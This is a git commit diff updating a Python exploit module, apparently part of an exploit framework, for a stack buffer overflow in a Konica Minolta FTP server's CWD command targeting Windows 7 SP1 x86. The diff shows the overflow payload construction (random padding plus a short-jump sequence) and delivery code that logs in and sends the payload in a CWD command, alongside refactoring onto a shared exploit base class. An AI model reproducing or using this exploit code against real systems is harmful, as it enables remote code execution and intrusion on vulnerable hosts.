1385b8b5974823e1213597d927449e60ba3dca04
raveneus <raveneus.cwillguy@gmail.com>
2016-05-21 18:36:54 -0500

    Update konica_minolta_cwd_overflow.py

--- framework/modules/windows/konica_minolta_cwd_overflow/konica_minolta_cwd_overflow.py
+++ framework/modules/windows/konica_minolta_cwd_overflow/konica_minolta_cwd_overflow.py
@@ -1,4 +1,7 @@
-class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
+import os, sys
+sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
+import core
+class konicaMinoltaCwdOverflowMenu(core.Exploit):
     def generate(self, p):
       p += self.rand(1037)
       p += "\xEB\x06b<\x9Dm \x12"
@@ -7,14 +10,14 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     def deliver(self, p):
       self.init_deliver()
       s = self.connect()
-      s.send("USER " + self.user[0])
+      s.send("USER " + self.variables["user"])
       s.recv(1024)
-      s.send("PASS " + self.passwd[0])
+      s.send("PASS " + self.variables["passwd"])
       s.recv(1024)
-      s.send("CWD " + payload)
+      s.send("CWD " + p)
       self.disconnect(s)
 def main():
-  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu()
+  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu("konica_minolta_cwd_overflow", "Windows 7 SP1 x86", "konica_minolta_cwd.shell", {"user":"", "passwd":"", "host":""}, {"user":"the user to login as", "passwd":"the password to use", "host":"the IP of the target"})
   konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
-if __name__ == __main__:
+if __name__ == '__main__':
   main()
